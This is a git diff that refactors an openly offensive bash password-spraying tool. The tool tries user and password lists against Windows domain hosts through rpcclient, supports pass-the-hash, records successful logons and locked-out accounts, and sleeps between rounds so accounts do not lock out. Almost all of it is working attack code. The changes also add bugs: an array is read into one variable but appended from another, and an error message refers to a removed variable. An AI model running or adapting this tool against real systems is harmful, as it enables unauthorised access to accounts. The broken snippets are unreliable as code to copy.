@@ -47,7 +47,7 @@ trap quit INT
 
 function quit() { 
     print "Trapped CTRL-C"
-    exit 0
+    exit 130
 }
 
 function print()         { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }
@@ -59,13 +59,12 @@ function print_date()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$
 function print_error()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }
 
 function print_lockout() { 
-    printf "%s > %s » The password spraying attack has \
-been paused for %s minutes to prevent accounts from \
-being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$(($LOCKOUT_DURATION / 60))"
+    printf "%s > %s » The attack has been paused for %s seconds (approx. %s minutes) to prevent accounts from \
+being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$LOCKOUT_DURATION" "$(($LOCKOUT_DURATION / 60))"
 }
 
 function write_locked_log()  {
-    if ! [ -f "${OUT_FOLDER}/locked.log" ]
+    if ! [[ -f "${OUT_FOLDER}/locked.log" ]]
     then
         mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/locked.log"
     fi
@@ -74,9 +73,9 @@ function write_locked_log()  {
 }
 
 function write_results_log() { 
-    if ! [ -f "${OUT_FOLDER}/$2" ]
+    if ! [[ -f "${OUT_FOLDER}/$2" ]]
     then
-        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2"
+        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2.log"
     fi
 
     printf "%s %s\n" "$(date "$DATE_FORMAT")" "$1" >> "${OUT_FOLDER}/${2}.log"
@@ -91,9 +90,7 @@ function parse_args() {
 
     while (($# > 0))
     do
-        OPT=$1
-
-        case $OPT in
+        case $1 in
             --help)
                 usage
                 exit 0
@@ -130,62 +127,51 @@ function parse_args() {
                 ;;
             -d)
                 dflag=1
-                OPTARG=$2
-                DOMAINS=($OPTARG)
+                DOMAINS=($2)
                 ;;
             -D)
                 dflag=1
-                OPTARG=$2
-                load_array $OPTARG DOMAINS
+                load_array $2 DOMAINS
                 ;;
             -h)
                 hflag=1
-                OPTARG=$2
-                HOSTS=($OPTARG)
+                HOSTS=($2)
                 ;;
             -H)
                 hflag=1
-                OPTARG=$2
-                load_array $OPTARG HOSTS
+                load_array $2 HOSTS
                 ;;
             -la) # local authentication
                 dflag=1
                 DOMAINS=('WORKGROUP')
                 ;;
             -ld)
-                OPTARG=$2
-                LOCKOUT_DURATION=$OPTARG
+                LOCKOUT_DURATION=$2
                 ;;
             -lt) 
-                OPTARG=$2
-                LOCKOUT_THRESHOLD=$OPTARG
+                LOCKOUT_THRESHOLD=$2
                 ;;
             -o)
-                OPTARG=$2
-                OUT_FOLDER=$OPTARG
+                OUT_FOLDER=$2
                 ;;
             --pth)
                 RPCCLIENT_OPTIONS+=('--pw-nt-hash')
                 ;;
             -p)
                 pflag=1
-                OPTARG=$2
-                PASSWORDS=($OPTARG)
+                PASSWORDS=($2)
                 ;;
             -P)
                 pflag=1
-                OPTARG=$2
-                load_array $OPTARG PASSWORDS
+                load_array $2 PASSWORDS
                 ;;        
             -u)
                 uflag=1
-                OPTARG=$2
-                USERS=($OPTARG)
+                USERS=($2)
                 ;;
             -U)
                 uflag=1
-                OPTARG=$2
-                load_array $OPTARG USERS
+                load_array $2 USERS
                 ;;       
             -*)
                 printf "%s: illegal option -- %s\n" "$PROGNAME" "$OPT"
@@ -196,28 +182,10 @@ function parse_args() {
         shift      
     done
 
-    if [[ $dflag = 0 ]]
+    if [[ $dflag = 0 || $hflag = 0 || $pflag = 0 || $uflag = 0 ]]
     then
         var=1
-        printf "%s: missing mandatory option -- d|D|la\n" "${PROGNAME}"
-    fi
-
-    if [[ $hflag = 0 ]]
-    then
-        var=1
-        printf "%s: missing mandatory option -- h|H\n" "${PROGNAME}"
-    fi
-
-    if [[ $pflag = 0 ]]
-    then
-        var=1
-        printf "%s: missing mandatory option -- p|P|creds\n" "${PROGNAME}"
-    fi
-
-    if [[ $uflag = 0 ]]
-    then
-        var=1
-        printf "%s: missing mandatory option -- u|U|creds\n" "${PROGNAME}"
+        printf "%s: missing mandatory option(s)\n" "${PROGNAME}"
     fi
 
     if [[ $var = 1 ]]
@@ -257,6 +225,8 @@ USAGE
 }
 
 function banner() {
+    local -ar vars=('DOMAINS' 'HOSTS' 'PASSWORDS' 'USERS' 'LOCKOUT_DURATION' 'LOCKOUT_THRESHOLD' 'OUT_FOLDER' 'VERBOSE')
+
 cat <<- BANNER
 ${PROGBASENAME^^} v${PROGVERSION}
 Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31
@@ -265,9 +235,13 @@ BANNER
 
     if [[ $VERBOSE = 2 ]]
     then
-        echo "$(declare -p)"$'\n'
-    fi
+        for var in ${vars[@]}
+        do
+            declare -p $var
+        done
 
+        echo ""
+    fi
 }
 
 function check_requirements() {
@@ -303,20 +277,20 @@ function check_requirements() {
 }
 
 function load_array() {
-    local -n array=$2
-    local -a var
+    local -n _vars=$2 # referenced copy of the array passed to the function
+    local -a vars
 
     if [[ -d $(realpath $1) ]]
     then
         for i in $(realpath $1)/*
         do
             readarray -t var < $(realpath "$i")
-            array+=(${var[@]})
-            unset var
+            _vars+=(${vars[@]})
+            unset vars
         done
     elif [[ -f $(realpath $1) ]]
     then
-        readarray -t array < $(realpath $1)
+        readarray -t _vars < $(realpath $1)
     else
         print_error "$1 is not a valid directory or file"
         exit 1
@@ -332,17 +306,17 @@ function spray() {
     local    var
     local    var1
     local    var2
-    local -i sflag=0 # enable verbose for the successful and lockout attempts (works even when verbose is disabled)
+    local -i vflag=0 # enable verbose for the successful and lockout attempts (works even when verbose is disabled)
     local -a _PASSWORDS
     local -a _USERS  # create a local copy of USERS
 
-    _PASSWORDS=(${PASSWORDS[@]}) # reindex the array to remove empty entries
+    _PASSWORDS=(${PASSWORDS[@]}) # reindex the array to remove any blank/empty entries
 
     for domain in ${DOMAINS[@]}
     do
         for host in ${HOSTS[@]}
         do
-            _USERS=(${USERS[@]}) # reindex the array to remove empty entries and entries removed in previous iterations
+            _USERS=(${USERS[@]}) # reindex the array to remove any blank/empty entries and entries removed in previous iterations
 
             for ((i=0; i <= ((${#_PASSWORDS[@]} - 1)); i++))
             do 
@@ -371,7 +345,7 @@ function spray() {
                         if [[ $ERROR = 'NT_STATUS_ACCOUNT_LOCKED_OUT' ]]
                         then
                             write_locked_log "${domain}\\${user}"
-                            sflag=1
+                            vflag=1
                         fi
                     else
                         var2=' -> LOGON SUCCESS '
@@ -393,13 +367,13 @@ function spray() {
                             _USERS=(${_USERS[@]})
                         fi
 
-                        sflag=1
+                        vflag=1
                     fi
 
-                    if [[ $VERBOSE > 0 || $sflag = 1 ]]
+                    if [[ $VERBOSE > 0 || $vflag = 1 ]]
                     then
                         print_attempt "$var" "$var1" "$var2"
-                        sflag=0
+                        vflag=0
                     fi
 
                     if [[ $CFLAG = 1 ]]
@@ -415,7 +389,7 @@ function spray() {
                 fi
 
                 # avoid account lockout
-                if [[ $CFLAG = 0 ]] && ! (( $counter % $LOCKOUT_THRESHOLD ))
+                if ! (( $counter % $LOCKOUT_THRESHOLD ))
                 then
                     print_lockout
                     sleep $LOCKOUT_DURATION
